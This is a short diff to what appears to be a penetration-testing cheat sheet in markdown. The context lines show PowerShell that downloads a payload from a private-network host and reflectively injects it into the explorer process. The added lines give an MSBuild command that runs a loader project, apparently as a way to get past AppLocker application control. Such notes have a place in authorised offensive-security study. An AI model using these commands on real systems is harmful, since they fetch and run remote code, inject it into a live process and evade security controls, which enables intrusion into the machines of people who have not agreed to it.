@@ -29,6 +29,10 @@ $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.192/b
 $procid = (Get-Process -Name explorer).Id
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
+- msbuild
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe MSBUILDLoader.csproj
+```
 
 - check if applocker blocking:
 ```
